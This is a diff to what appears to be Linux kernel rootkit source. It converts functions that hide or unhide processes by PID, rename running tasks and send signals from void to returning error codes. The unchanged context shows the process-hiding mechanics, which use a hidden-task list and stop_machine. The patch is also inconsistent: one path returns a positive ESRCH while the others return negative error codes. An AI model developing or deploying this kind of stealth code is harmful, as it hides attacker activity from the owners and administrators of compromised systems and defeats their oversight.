@@ -292,13 +292,16 @@ out:
 #endif
 }
 
-void kv_send_signal(int sig, struct task_struct *task)
+int kv_send_signal(int sig, struct task_struct *task)
 {
-	if (task) {
-		struct pid *pid = task_pid(task);
-		prinfo("Send sig %d to task %p\n", sig, task);
-		kill_pid(pid, sig, 0);
-	}
+	struct pid *pid;
+	if (!task)
+		return -ESRCH;
+
+	pid = task_pid(task);
+	prinfo("Send sig %d to task %p\n", sig, task);
+
+	return kill_pid(pid, sig, 0);
 }
 
 void kv_reload_hidden_task(struct task_struct *task)
@@ -341,8 +344,9 @@ bool kv_find_hidden_task(struct task_struct *task)
 	return false;
 }
 
-void kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
+int kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 {
+	int rc = 0;
 	struct task_struct *task = _check_hide_by_pid(pid);
 	if (task) {
 		if (op == CHILDREN)
@@ -354,6 +358,7 @@ void kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 			if ((status = stop_machine(_unhide_task, &ht, NULL))) {
 				prerr("!!!! Error unhide_task %p: %d\n",
 				      ht.task, status);
+				rc = -EINVAL;
 			} else {
 				/** operate within list safe */
 				_cleanup_node_list(ht.task);
@@ -366,7 +371,11 @@ void kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 		/* if visible, hide */
 		_select_children(task);
 		_fetch_children_and_hide_tasks(task, saddr);
+	} else {
+		rc = ESRCH;
 	}
+
+	return rc;
 }
 
 /**
@@ -442,14 +451,15 @@ void kv_pid_cleanup(void)
 #endif
 }
 
-void kv_rename_task(pid_t pid, const char *newname)
+int kv_rename_task(pid_t pid, const char *newname)
 {
+	int rc = 0;
 	struct task_struct *task;
 	char buf[TASK_COMM_LEN] = { 0 };
 
 	struct kernel_syscalls *ks = kv_kall_load_addr();
 	if (!ks || !newname || pid <= 1)
-		return;
+		return -EINVAL;
 
 	for_each_process (task) {
 		if (pid == task->pid) {
@@ -457,11 +467,15 @@ void kv_rename_task(pid_t pid, const char *newname)
 				task, newname,
 				false /** not restart/new process */);
 			get_task_comm(buf, task);
-			if (*buf != 0)
+			if (!*buf) {
+				rc = -EINVAL;
+			} else {
 				prinfo("New process name: '%s'\n", buf);
+			}
 			break;
 		}
 	}
+	return rc;
 }
 
 void kv_show_saved_tasks(void)
